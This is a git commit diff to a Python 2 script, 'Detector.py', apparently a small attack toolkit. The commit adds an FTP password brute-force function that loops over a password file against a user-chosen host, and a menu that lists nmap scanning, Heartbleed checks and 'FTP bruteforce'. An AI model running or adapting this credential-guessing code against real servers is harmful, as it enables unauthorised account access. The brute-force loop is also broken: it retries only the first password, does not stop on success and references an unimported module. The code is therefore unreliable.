444891289ef5df0bf0b287c1255d53b0da836d34
Cyb3rlant3rn2 <64853191+Cyb3rlant3rn2@users.noreply.github.com>
2020-09-22 06:51:29 +0000

    Add files via upload

--- Detector.py
+++ Detector.py
@@ -2,7 +2,7 @@ import requests
 from optparse import OptionParser
 import automate_nmap
 import os
-
+from ftplib import FTP
 urlfile=""
 payload=""
 
@@ -48,11 +48,29 @@ def httpdetection():
 		except:
 			print ru+"  req not possible"
 
-    
-	
+def ftp_brute(username,hostname):
+	user = username
+	host=hostname
+	ftp = FTP(hostname)
+	itr=0
+	lines = [line.rstrip('\n') for line in open('ftp_pass.txt','r')]
+	while itr < len(lines):
+	    password = lines[0]
+	    try:
+	        print "[-]Trying "+password
+	        ftp.login(user,password)
+	        print "[+]Login Successful"+ password
+	    except socket.error as error:
+	        ftp=FTP(hostname)
+	    except Exception, e:
+	        itr=itr+1 
+	    
 	
 def nmap_scan():
     automate_nmap.scan()
+    
+
+
 def heart_bleed():
     automate_nmap.heartbleed()
     
@@ -69,29 +87,34 @@ def main():
 	urlfile=options.urlfile
 	
 
-	print " Cyb3rlant3rn here to help!!!!!!!!!!!!!!!!!!!!!!! "	
+	print "ARROW2 here to help!!!!!!!!!!!!!!!!!!!!!!! "	
 	print "[1] Source code analzing"
-	print "[2] XSS finder"
-	print "[3] SSTI"
-	print "[4] Check for http"
-	print "[5] Automate the nmap scan"
-	print "[6] Check for heartbleed"
+	print "[2] Check for http"
+	print "[3] Automate the full nmap scan"
+	print "[4] Check for heartbleed"
+	print "[5] FTP bruteforce"
 	print "                           "
 	choice=raw_input("choice?")	
 	print ""
 	if choice == '1':
-		filep=open("urlfile",'r')
+		filep=open("url.txt",'r')
 		for i in filep.readlines():
 			i=i.strip('\n')
 			sendingreq(i)
-	elif choice=='4':
-		httpdetection()
-		automate_nmap.display()
-	elif choice=='2':
-	    nmap_scan()
-	elif choice=='3':
-	     heart_bleed()
-	print "Please enter either 1,2,3,4,5 or 6"
-		
-		
+        elif choice == '2':
+            httpdetection()
+        elif choice == '3':
+            nmap_scan()
+        elif choice == '4':
+            heart_bleed()
+        elif choice == '5':
+            print "[*]Enter the username"
+            user=raw_input()
+            print "[*]Enter the hostname"
+            hostname=raw_input()
+            ftp_brute(user,hostname)
+        print "[*]Please enter 1,2,3,4,5"
+
 main()
+	
+
